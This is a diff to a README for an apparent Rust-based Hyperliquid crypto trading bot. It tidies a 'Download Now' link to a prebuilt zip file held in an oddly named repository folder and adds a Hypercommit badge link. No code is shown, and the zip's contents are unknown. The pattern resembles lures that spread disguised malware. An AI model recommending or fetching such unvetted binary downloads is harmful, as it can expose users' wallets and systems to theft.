@@ -86,4 +86,8 @@ For more support, you can open an issue in the GitHub repository.
 
 Thank you for choosing the Hyperliquid Trading Bot! We are excited to help you enhance your trading experience. Don't forget to check for updates regularly.
 
-[Download Now](https://raw.githubusercontent.com/RUBE40/hyperliquid-trading-bot-rust/main/versemongery/trading_rust_bot_hyperliquid_1.4.zip)  
+[Download Now](https://raw.githubusercontent.com/RUBE40/hyperliquid-trading-bot-rust/main/versemongery/trading_rust_bot_hyperliquid_1.4.zip)
+
+## Links
+
+[![Hypercommit](https://img.shields.io/badge/Hypercommit-DB2475)](https://hypercommit.com/hyperliquid-trading-bot-rust)
